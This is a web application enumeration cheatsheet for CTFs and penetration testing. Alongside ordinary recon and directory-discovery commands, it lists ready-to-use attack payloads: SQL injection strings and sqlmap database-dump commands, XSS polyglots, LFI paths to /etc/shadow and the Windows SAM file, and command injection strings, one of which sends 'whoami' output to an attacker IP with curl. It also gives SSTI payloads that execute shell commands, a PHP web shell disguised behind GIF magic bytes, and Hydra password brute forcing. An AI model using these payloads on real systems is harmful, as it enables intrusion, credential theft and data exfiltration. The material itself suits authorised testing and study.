# Web Application Enumeration Cheatsheet

> A comprehensive guide for enumerating web applications during CTFs and penetration testing.

---

## 📋 Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Technology Detection](#technology-detection)
3. [Directory & File Discovery](#directory--file-discovery)
4. [Parameter Discovery](#parameter-discovery)
5. [Subdomain Enumeration](#subdomain-enumeration)
6. [Common Vulnerabilities](#common-vulnerabilities)
7. [Authentication Testing](#authentication-testing)
8. [API Testing](#api-testing)
9. [File Upload Testing](#file-upload-testing)
10. [Headers & Cookies](#headers--cookies)
11. [CMS Specific](#cms-specific)
12. [Useful Tools & Commands](#useful-tools--commands)

---

## Reconnaissance

```bash
# DNS enumeration
dig <domain> ANY
dig <domain> A
dig <domain> MX
dig <domain> NS
dig <domain> TXT
dig -x <ip>                 # Reverse DNS
host <domain>
nslookup <domain>

# WHOIS
whois <domain>

# Certificate transparency logs
curl -s "https://crt.sh/?q=%.<domain>&output=json" | jq .

# Wayback Machine
curl -s "http://web.archive.org/cdx/search/cdx?url=*.example.com/*&output=json&fl=original" | jq -r '.[]'

# Sublist3r
sublist3r -d <domain> -o output.txt

# Amass
amass enum -d <domain>
amass enum -passive -d <domain>
amass enum -active -d <domain>

# Assetfinder
assetfinder --subs-only <domain>

# Findomain
findomain -t <domain>

# DNS brute force
gobuster dns -d <domain> -w /usr/share/wordlists/dnsmap.txt
```

---

## Technology Detection

```bash
# Wappalyzer (CLI)
wappalyzer <url>

# WhatWeb
whatweb <url>
whatweb -v <url>
whatweb -a 3 <url>          # Aggressive mode

# BuiltWith
# https://builtwith.com/

# Nmap scripts
nmap -sV --script=http-enum <target>
nmap -sV --script=http-title <target>
nmap -sV --script=http-headers <target>

# curl headers
curl -I <url>
curl -I -s <url> | grep -i "server\|x-powered-by\|via"

# Check robots.txt
curl -s <url>/robots.txt

# Check sitemap
curl -s <url>/sitemap.xml

# Security headers
curl -I -s <url> | grep -i "strict-transport\|x-frame\|x-xss\|content-security\|x-content-type"

# Favicon hash
# Download favicon and compute hash for framework identification
curl -s <url>/favicon.ico | md5sum
curl -s <url>/favicon.ico | python3 -c "import sys,mmh3;print(mmh3.hash(sys.stdin.buffer.read()))"
```

---

## Directory & File Discovery

```bash
# Gobuster
gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,json,xml,bak
gobuster dir -u <url> -w /usr/share/wordlists/dirb/big.txt -t 50
gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -s 200,204,301,302,307,401,403

# Dirsearch
python3 dirsearch.py -u <url> -e php,txt,html,js -t 50
python3 dirsearch.py -u <url> -e php,txt,html,js --recursive

# FFUF
ffuf -u <url>/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u <url>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.txt,.html,.bak
ffuf -u <url>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401,403,405

# Feroxbuster
feroxbuster -u <url> -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html

# Common files to check
/admin
/login
/register
/api
/backup
/config
/debug
/test
/dev
/staging
/.env
/.git
/.svn
/.htaccess
/robots.txt
/sitemap.xml
/crossdomain.xml
/.well-known/
```

---

## Parameter Discovery

```bash
# Arjun
arjun -u <url>
arjun -u <url> --get
arjun -u <url> --post
arjun -u <url> -m POST -t 20

# ParamMiner (Burp Suite extension)
# Install from BApp Store

# FFUF for parameter fuzzing
ffuf -u <url>?FUZZ=test -w /usr/share/wordlists/params.txt
ffuf -u <url> -X POST -d "FUZZ=test" -w /usr/share/wordlists/params.txt

# Common parameters
?id=
?page=
?file=
?path=
?url=
?redirect=
?return=
?next=
?callback=
?cmd=
?exec=
?command=
?query=
?search=
?q=
?s=
?searchfor=
?keyword=
```

---

## Subdomain Enumeration

```bash
# Sublist3r
sublist3r -d <domain> -o subdomains.txt

# Amass
amass enum -d <domain> -o subdomains.txt
amass enum -passive -d <domain>
amass enum -active -d <domain> -brute -w /usr/share/wordlists/dnsmap.txt

# Assetfinder
assetfinder --subs-only <domain> > subdomains.txt

# Findomain
findomain -t <domain> -o

# Subfinder
subfinder -d <domain> -o subdomains.txt
subfinder -d <domain> -all -o subdomains.txt

# Knockpy
knockpy <domain>

# DNS brute force
gobuster dns -d <domain> -w /usr/share/wordlists/dnsmap.txt -t 50

# Permutation/alteration
dnsgen subdomains.txt | massdns -r /usr/share/wordlists/resolvers.txt -o S -q

# Subdomain takeover
tko-subs -domains=subdomains.txt -data=providers-data.csv
subjack -w subdomains.txt -t 100 -timeout 30 -ssl -c /usr/share/subjack/fingerprints.json
```

---

## Common Vulnerabilities

### SQL Injection
```bash
# Basic tests
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
" OR "1"="1
" OR "1"="1" --
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
1' AND 1=1--
1' AND 1=2--
1' OR '1'='1
1' AND SLEEP(5)--
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--

# SQLMap
sqlmap -u "<url>?id=1"
sqlmap -u "<url>?id=1" --dbs
sqlmap -u "<url>?id=1" -D <database> --tables
sqlmap -u "<url>?id=1" -D <database> -T <table> --columns
sqlmap -u "<url>?id=1" -D <database> -T <table> -C <columns> --dump
sqlmap -u "<url>" --data="id=1" --level=5 --risk=3
sqlmap -u "<url>" --cookie="id=1" --level=2
sqlmap -u "<url>" --forms --batch
sqlmap -r request.txt
```

### XSS (Cross-Site Scripting)
```html
<!-- Basic -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>

<!-- Polyglots -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=alert()//>>

<!-- Filter bypasses -->
<scr<script>ipt>alert(1)</scr</script>ipt>
"><img src=x onerror=alert(1)>
'-"><img src=x onerror=alert(1)>
```

### LFI/RFI
```bash
# Local File Inclusion
?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?page=..%2f..%2f..%2fetc%2fpasswd
?page=php://filter/read=convert.base64-encode/resource=index.php
?page=php://input
?page=data://text/plain,<?php phpinfo();?>
?page=expect://id

# Wrappers
php://filter/read=convert.base64-encode/resource=<file>
php://input
file://<path>
data://text/plain;base64,<base64>
zip://<path>#<file>
phar://<path>

# Common files to read
/etc/passwd
/etc/shadow
/etc/hosts
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/var/log/apache2/access.log
/var/log/nginx/access.log
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM
```

### Command Injection
```bash
# Basic tests
; id
| id
` id `
$(id)
&& id
|| id
# id

# Blind command injection
; sleep 5
| sleep 5
` sleep 5 `
$(sleep 5)
; ping -c 5 <your-ip>
; curl <your-ip>/?data=$(whoami)

# Encoded
%3B%20id
%7C%20id
%60%20id%20%60
%24%28id%29
```

### SSTI (Server-Side Template Injection)
```
# Jinja2 (Python)
{{7*7}}
{{config}}
{{self.__init__.__globals__}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Twig (PHP)
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# ERB (Ruby)
<%= 7*7 %>
<%= File.open('/etc/passwd').read %>

# Handlebars
{{7*7}}
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{conslist (lookup string.sub "constructor") (lookup string "trim")}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### SSRF (Server-Side Request Forgery)
```
# Basic tests
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://0177.0000.0000.0001
http://2130706433
http://3232235521

# Bypass filters
http://127.1
http://127.0.1
http://0177.1
http://0x7f.0x0.0x0.0x1
http://0x7f000001

# Protocols
file:///etc/passwd
dict://localhost:11211/
gopher://localhost:3306/
ldap://localhost:389/
ftp://localhost:21/
```

---

## Authentication Testing

```bash
# Default credentials
# https://github.com/ihebski/DefaultCreds-cheat-sheet
# admin:admin, admin:password, root:root, etc.

# Brute force with Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
hydra -L users.txt -P passwords.txt <target> ssh
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> ftp

# Brute force with FFUF
ffuf -u <url>/login -X POST -d "username=admin&password=FUZZ" -w /usr/share/wordlists/rockyou.txt -mc 302

# JWT testing
# Decode: https://jwt.io/
# None algorithm
python3 -c "import jwt; print(jwt.encode({'user':'admin'}, '', algorithm='none'))"
# Weak secret brute force
jwt_tool.py <token> -d /usr/share/wordlists/rockyou.txt

# Session management
# Check for predictable session IDs
# Check for session fixation
# Check for missing HttpOnly/Secure flags on cookies
```

---

## API Testing

```bash
# Common API endpoints
/api
/api/v1
/api/v2
/api/users
/api/admin
/swagger
/swagger-ui.html
/api-docs
/v1/api
/graphql
/graphiql

# HTTP methods
curl -X GET <url>/api/users
curl -X POST <url>/api/users -H "Content-Type: application/json" -d '{"name":"test"}'
curl -X PUT <url>/api/users/1 -H "Content-Type: application/json" -d '{"name":"test"}'
curl -X DELETE <url>/api/users/1
curl -X PATCH <url>/api/users/1 -H "Content-Type: application/json" -d '{"name":"test"}'

# IDOR (Insecure Direct Object Reference)
curl <url>/api/users/1
curl <url>/api/users/2
curl <url>/api/users/admin

# GraphQL introspection
curl -X POST <url>/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{types{name,fields{name}}}}"}'

# REST API fuzzing
ffuf -u <url>/api/FUZZ -w /usr/share/wordlists/api-endpoints.txt
ffuf -u <url>/api/v1/FUZZ -w /usr/share/wordlists/api-endpoints.txt
```

---

## File Upload Testing

```bash
# Extensions to try
.php
.php3
.php4
.php5
.phtml
.jsp
.jspx
.asp
.aspx
.py
.pl
.sh
.cgi

# Bypass techniques
shell.php.jpg
shell.php%00.jpg
shell.p.phphp
shell.PhP
shell.php.
shell.php...
shell.php%20
shell.php%0d%0a
shell.php%0a
shell.php%00
shell.php;.jpg
shell.php%00.jpg
shell.php%0d%0a.jpg
shell.php%0a.jpg

# Content-Type bypass
Content-Type: image/jpeg
Content-Type: application/octet-stream
Content-Type: text/plain

# Magic bytes
GIF89a; <?php system($_GET['cmd']); ?>
```

---

## Headers & Cookies

```bash
# Important headers to check
X-Frame-Options
X-XSS-Protection
Content-Security-Policy
Strict-Transport-Security
X-Content-Type-Options
Referrer-Policy
Permissions-Policy

# Cookie flags
HttpOnly
Secure
SameSite

# Test for Host header injection
curl -H "Host: evil.com" <url>
curl -H "X-Forwarded-Host: evil.com" <url>
curl -H "X-Forwarded-For: 127.0.0.1" <url>

# Test for CORS misconfiguration
curl -H "Origin: https://evil.com" -I <url>
```

---

## CMS Specific

### WordPress
```bash
# WPScan
wpscan --url <url>
wpscan --url <url> --enumerate u
wpscan --url <url> --enumerate p
wpscan --url <url> --enumerate t
wpscan --url <url> --enumerate vp
wpscan --url <url> --passwords /usr/share/wordlists/rockyou.txt --usernames admin

# Common paths
/wp-login.php
/wp-admin/
/wp-content/
/wp-content/uploads/
/wp-config.php
/xmlrpc.php
/wp-json/wp/v2/users
```

### Drupal
```bash
# Droopescan
python3 droopescan scan drupal -u <url>

# Common paths
/user/login
/user/register
/admin
/sites/default/settings.php
```

### Joomla
```bash
# Joomscan
perl joomscan.pl --url <url>

# Common paths
/administrator/
/configuration.php
```

---

## Useful Tools & Commands

```bash
# Nikto
nikto -h <url>
nikto -h <url> -Tuning 1234567890abc

# Nuclei
nuclei -u <url>
nuclei -u <url> -t /path/to/templates/

# Burp Suite
# Spider, Scanner, Intruder, Repeater, Sequencer, Decoder, Comparer

# ZAP (OWASP Zed Attack Proxy)
zap-cli quick-scan --self-contained --start-options "-config api.disablekey=true" <url>

# HTTPie
http <url>
http GET <url>
http POST <url> name=value

# cURL tricks
curl -v <url>               # Verbose
curl -L <url>               # Follow redirects
curl -k <url>               # Ignore SSL
curl -A "Mozilla/5.0" <url> # Custom User-Agent
curl -H "X-Custom: value" <url>  # Custom header
curl -X POST -d "data=value" <url>
curl -X POST -H "Content-Type: application/json" -d '{"key":"value"}' <url>
curl -b "cookie=value" <url>
curl -c cookies.txt <url>
curl -o output.html <url>
curl -s <url> | grep -i "flag\|password\|secret\|key"

# Wget
wget --mirror --convert-links --adjust-extension --page-requisites --no-parent <url>

# EyeWitness
./EyeWitness.py --web -f urls.txt -d output

# Aquatone
aquatone-discover --domain <domain>
aquatone-scan --domain <domain>
aquatone-takeover --domain <domain>

# Waybackurls
cat domains.txt | waybackurls > urls.txt
cat urls.txt | grep -E "\.php|\.asp|\.jsp|\.html|\.txt|\.xml|\.json" > interesting.txt

# Gau (GetAllUrls)
gau <domain>
gau --subs <domain>

# Hakrawler
echo <url> | hakrawler
echo <url> | hakrawler -subs

# Katana
katana -u <url>
katana -u <url> -d 5
```

---

## 🔧 Quick Enumeration Workflow

```bash
# 1. Initial recon
whatweb <url>
curl -I <url>
curl -s <url>/robots.txt

# 2. Technology detection
wappalyzer <url>
nmap -sV --script=http-enum <target>

# 3. Directory discovery
gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,js,bak

# 4. Parameter discovery
arjun -u <url>

# 5. Subdomain enumeration
subfinder -d <domain>
amass enum -d <domain>

# 6. Vulnerability scanning
nikto -h <url>
nuclei -u <url>

# 7. Manual testing
# Test for SQLi, XSS, LFI, RCE, SSRF, etc.
```

---
